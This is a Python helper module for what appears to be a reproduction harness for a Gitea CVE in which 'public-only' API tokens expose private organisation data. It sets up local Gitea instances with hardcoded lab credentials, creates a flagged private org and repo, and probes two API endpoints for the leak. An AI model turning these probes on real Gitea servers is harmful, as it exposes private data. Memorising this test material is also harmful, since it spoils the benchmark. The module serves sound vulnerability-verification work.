"""Shared plumbing for gitea-cve-2026-25714 (public-only token org-data leak)."""

import re
import time
import requests

BASE = {"v0": "http://127.0.0.1:56840", "v1": "http://127.0.0.1:56841", "v2": "http://127.0.0.1:56842"}
ADMIN = "pcbadmin"
PASS = "Admin12345!"


def wait_ready(version: str, timeout: int = 240) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            r = requests.get(f"{BASE[version]}/", timeout=5)
            if r.status_code < 500:
                return True
        except Exception:
            pass
        time.sleep(4)
    return False


def wait_version(version: str, timeout: int = 300) -> bool:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            r = requests.get(f"{BASE[version]}/api/v1/version", timeout=5)
            if r.status_code == 200:
                return True
        except Exception:
            pass
        time.sleep(5)
    return False


def install(version: str) -> bool:
    base = BASE[version]
    port = base.split(":")[-1]
    s = requests.Session()
    try:
        html = s.get(f"{base}/", timeout=10).text
    except requests.exceptions.RequestException:
        return wait_ready(version, timeout=240)
    if "admin_name" not in html:
        return True  # already installed
    m = re.search(r'name="_csrf" content="([^"]+)"', html)
    data = {
        "_csrf": m.group(1) if m else "", "db_type": "sqlite3", "db_path": "/data/gitea/gitea.db",
        "app_name": "Gitea", "repo_root_path": "/data/git/repositories", "run_user": "git",
        "domain": "localhost", "ssh_port": "22", "http_port": "3000",
        "app_url": f"http://localhost:{port}/", "log_root_path": "/data/gitea/log",
        "admin_name": ADMIN, "admin_passwd": PASS, "admin_confirm_passwd": PASS,
        "admin_email": "admin@pcb.local",
    }
    try:
        # The install POST blocks while Gitea runs install-time schema migrations. On 1.26.x
        # (v1/v2) that set is large enough to exceed a 30s client timeout on a loaded host, which
        # raised an uncaught ReadTimeout and crashed the oracle before it emitted gate JSON
        # (verdict=incomplete). Raise the budget and tolerate a slow-but-successful install: the
        # migration still completes server-side, so fall through to wait_ready either way.
        s.post(f"{base}/", data=data, timeout=180)
    except requests.exceptions.RequestException:
        pass
    return wait_ready(version, timeout=240)


def wait_api_auth(version: str, auth, timeout: int = 180) -> bool:
    """Block until the authenticated API is live and stable.

    After the install-wizard POST, Gitea performs a graceful self-restart to apply the new config.
    `wait_version()` can return while the HTTP listener is still bouncing, so the very next authed
    call races the restart and hits `[Errno 111] Connection refused` (uncaught -> oracle crashes
    before emitting gate JSON -> verdict=incomplete). Poll an authed endpoint until it answers 200.
    """
    base = BASE[version]
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            r = requests.get(f"{base}/api/v1/user", auth=auth, timeout=5)
            if r.status_code == 200:
                return True
        except requests.exceptions.RequestException:
            pass
        time.sleep(3)
    return False


def setup(version: str, flag: str):
    """Install, create private org + private repo (names embed the flag) and a public-only token."""
    install(version)
    wait_version(version)
    base = BASE[version]
    auth = (ADMIN, PASS)
    # Wait out Gitea's post-install self-restart before any authed call (see wait_api_auth).
    wait_api_auth(version, auth)
    org = ("pcb_" + flag.lower())[:40]
    for _ in range(6):
        try:
            r = requests.post(f"{base}/api/v1/orgs", auth=auth,
                              json={"username": org, "visibility": "private",
                                    "description": flag.lower()}, timeout=15)
            if r.status_code in (201, 422):
                break
        except requests.exceptions.RequestException:
            pass
        time.sleep(3)
    for _ in range(6):
        try:
            r = requests.post(f"{base}/api/v1/orgs/{org}/repos", auth=auth,
                              json={"name": "secret_" + flag.lower(), "private": True,
                                    "auto_init": True, "default_branch": "main"}, timeout=30)
            if r.status_code in (201, 409):  # 201 created / 409 already exists
                break
        except requests.exceptions.RequestException:
            pass
        time.sleep(3)
    tok = None
    for i in range(6):
        try:
            r = requests.post(f"{base}/api/v1/users/{ADMIN}/tokens", auth=auth,
                              json={"name": f"pubtok{int(time.time())}{i}", "scopes": [
                                  "read:user", "read:organization", "read:repository", "public-only"]},
                              timeout=15)
            if r.status_code in (201, 200) and "sha1" in r.text:
                tok = r.json()["sha1"]
                break
        except requests.exceptions.RequestException:
            pass
        time.sleep(3)
    return org, tok


def seed_probe(version: str, flag: str) -> dict:
    """GET /orgs/{org}/repos with the public-only token."""
    org, tok = setup(version, flag)
    if tok is None:
        return {"ok": False, "status": 0, "body": "setup failed: no token"}
    for _ in range(4):
        try:
            r = requests.get(f"{BASE[version]}/api/v1/orgs/{org}/repos",
                             headers={"Authorization": f"token {tok}"}, timeout=15)
            return {"ok": r.status_code == 200 and flag.lower() in r.text,
                    "status": r.status_code, "body": r.text[:200]}
        except requests.exceptions.RequestException:
            time.sleep(5)
    return {"ok": False, "status": 0, "body": "probe failed after retries"}


def residual_probe(version: str, flag: str) -> dict:
    """GET /user/orgs with the public-only token."""
    org, tok = setup(version, flag)
    if tok is None:
        return {"ok": False, "status": 0, "body": "setup failed: no token"}
    for _ in range(4):
        try:
            r = requests.get(f"{BASE[version]}/api/v1/user/orgs",
                             headers={"Authorization": f"token {tok}"}, timeout=15)
            return {"ok": r.status_code == 200 and flag.lower() in r.text,
                    "status": r.status_code, "body": r.text[:200]}
        except requests.exceptions.RequestException:
            time.sleep(5)
    return {"ok": False, "status": 0, "body": "probe failed after retries"}
